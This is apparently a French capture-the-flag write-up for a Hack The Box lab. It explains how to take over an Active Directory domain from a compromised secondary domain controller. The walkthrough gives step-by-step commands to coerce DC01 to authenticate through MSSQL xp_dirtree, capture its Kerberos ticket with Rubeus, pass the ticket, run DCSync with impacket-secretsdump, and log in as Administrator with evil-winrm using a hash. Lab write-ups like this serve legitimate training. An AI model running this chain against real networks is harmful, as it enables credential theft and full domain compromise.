# Kerberos Ticket Harvesting via MSSQL Linked Server

***

## <mark style="color:red;">Kerberos Ticket Harvesting via MSSQL Linked Server</mark>

_(Pivot Active Directory & compromission complète du domaine)_

***

### <mark style="color:blue;">🎯 Objectif du scénario</mark>

Nous disposons d’un **accès administrateur sur DC02** (`darkzero.ext`) et souhaitons **compromettre DC01** (`darkzero.htb`), qui est le **contrôleur de domaine principal**.

L’objectif est de :

* forcer DC01 à **s’authentifier vers DC02**
* **capturer les tickets Kerberos**
* **réutiliser ces tickets** pour obtenir un accès **Domain Admin**

***

### <mark style="color:blue;">🧠 Principe théorique clé</mark>

> En Active Directory, **toute authentification Kerberos génère des tickets** (TGT / TGS).\
> Si nous contrôlons la machine **qui reçoit l’authentification**, nous pouvons **observer et voler ces tickets**.

***

### <mark style="color:blue;">❌ Pourquoi NTLM Relay n’est pas possible ici</mark>

* **SMB Signing activé**
* Impossible de relayer NTLM sans vecteur supplémentaire
* Attaque trop bruyante

👉 **Kerberos Ticket Harvesting** est la méthode la plus :

* silencieuse
* fiable
* réaliste en environnement entreprise

***

### <mark style="color:blue;">🏗️ Architecture du lab</mark>

| Machine | Domaine      | Rôle                      |
| ------- | ------------ | ------------------------- |
| DC01    | darkzero.htb | DC principal + MSSQL      |
| DC02    | darkzero.ext | DC secondaire (compromis) |

Les deux domaines sont :

* **trusted**
* **forest transitive**
* **bidirectionnels**

***

### <mark style="color:blue;">🔎 Étape 1 – Vérification des relations de confiance</mark>

Sur **DC02** :

```cmd
nltest /domain_trusts /server:DC02
```

#### Résultat clé

```
darkzero.htb <-> darkzero.ext
Attr: foresttrans
```

#### Interprétation

* DC01 **fait confiance** à DC02
* Si DC01 s’authentifie vers DC02 :
  * DC02 reçoit les tickets Kerberos
  * Ces tickets sont exploitables

***

### <mark style="color:blue;">🔎 Étape 2 – Découverte des MSSQL Linked Servers</mark>

Depuis une session SQL liée à DC01 :

```
DC01  →  DC02.darkzero.ext
```

#### Pourquoi c’est critique

Un **linked server MSSQL** permet :

* à une instance SQL
* de faire exécuter des requêtes
* sur une autre machine

👉 On peut donc **forcer DC01 à agir comme client réseau**

***

### <mark style="color:blue;">🔐 Étape 3 – Préparer la capture Kerberos avec Rubeus</mark>

Sur **DC02**, avec des privilèges élevés :

```cmd
rubeus.exe monitor /interval:5 /nowrap
```

#### Ce que fait Rubeus

* Écoute passivement les événements Kerberos
* Capture :
  * TGT (Ticket Granting Ticket)
  * TGS (Service Ticket)
* Affiche les tickets en Base64

⚠️ Les premiers tickets observés concernent DC02 → **bruit**

***

### <mark style="color:blue;">🎯 Étape 4 – Forcer DC01 à s’authentifier (coercition)</mark>

Depuis la **session SQL sur DC01** :

```sql
xp_dirtree \\DC02.darkzero.ext\coerce_share
```

#### Ce qui se passe réellement

1. SQL Server sur DC01 tente d’accéder à un partage UNC
2. Windows initie une authentification SMB
3. Kerberos génère un ticket
4. DC02 reçoit et observe le ticket

👉 **Aucun exploit**, seulement un comportement normal de Windows

***

### <mark style="color:blue;">🎟️ Étape 5 – Capture du ticket Kerberos</mark>

Rubeus affiche alors un **nouveau ticket** :

* Compte : `DC01$`
* Type : TGT / TGS
* Niveau : **machine account Domain Controller**

🎯 **Ticket à très haute valeur**

***

### <mark style="color:blue;">🔄 Étape 6 – Conversion du ticket Kerberos</mark>

#### 1️⃣ Sauvegarde du ticket Base64

```bash
echo "BASE64_TICKET" > ticketb64
```

#### 2️⃣ Décodage en format Kerberos binaire

```bash
base64 --decode ticketb64 > ticket.kirbi
```

#### 3️⃣ Conversion en ccache (Linux)

```bash
impacket-ticketConverter ticket.kirbi dc01.ccache
```

***

### <mark style="color:blue;">🔑 Étape 7 – Utilisation du ticket Kerberos (Pass-the-Ticket)</mark>

```bash
export KRB5CCNAME=dc01.ccache
```

Le système Linux utilise maintenant **le ticket de DC01**.

***

### <mark style="color:blue;">🧨 Étape 8 – Dump du contrôleur de domaine (DCSync)</mark>

```bash
impacket-secretsdump -k -no-pass \
-dc-ip 10.10.11.89 \
DARKZERO.HTB/dc01\$@dc01.darkzero.htb \
-just-dc-user Administrator
```

#### Résultat

* NTLM hash de l’Administrateur du domaine
* Clés Kerberos AES
* Accès **complet au domaine**

***

### <mark style="color:blue;">🧑‍💻 Étape 9 – Connexion finale en Domain Admin</mark>

```bash
evil-winrm -i 10.10.11.89 \
-u Administrator \
-H 5917507bdf2ef2c2b0a869a1cba40726
```

***

